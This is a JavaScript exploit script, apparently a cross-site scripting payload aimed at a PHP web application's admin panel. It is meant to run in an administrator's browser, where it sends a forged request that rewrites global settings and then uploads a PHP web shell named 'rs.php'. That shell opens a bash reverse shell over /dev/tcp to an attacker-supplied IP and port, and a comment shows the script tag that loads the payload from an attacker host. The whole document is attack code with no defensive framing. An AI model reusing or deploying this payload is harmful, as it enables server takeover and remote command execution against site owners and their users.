//Script execution: <script src='http://attacker-ip:attacker_port/reverse_shell_upload.js'></script>

var protocol = "http://";
var target = document.location.host;

// This method will send the post request
function send_post_request(){

	var uri = "/index.php/admin/settings/globalsave";
	var data = "fields[sql_user]=root&fields[tmpFolderBaseName]="

	xhr = new XMLHttpRequest();
	xhr.open("POST", protocol + target + uri, true);
	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	xhr.send(data);
}

// This method will upload the email attachment with reverse shell payload
function upload_reverse_shell(){

	// call the uploaded reverse shell using http://victim/rs.php?ip=10.10.10.10&port=8001
	var reverseShell = "<?php $ip=$_GET['ip']; $port=$_GET['port']; $payload = \"/bin/bash -c 'bash -i >& /dev/tcp/\".$ip.\"/\".$port.\" 0>&1'\"; exec($payload); ?>";

	var fileSize = reverseShell.length;

	var boundary = "---------------------------158413537371804998625757613";

	var uri = "/test.php/path/subpath/endpoint/";

	xhr = new XMLHttpRequest();
	xhr.open("POST", protocol + target + uri, true);
	xhr.setRequestHeader('Content-Type', 'multipart/form-data; boundary=' + boundary);
	xhr.withCredentials = "true";

	var body = "";
	body += "--" + boundary + "\r\n";
	
	body += 'Content-Disposition: form-data; name="newAttachment"; filename="rs.php"\r\n\r\n';
	body += reverseShell + "\r\n\r\n";
	body += "--" + boundary + "--";

	xhr.send(body);
	return true;
}

send_post_request();
setTimeout(upload_reverse_shell, 2000);
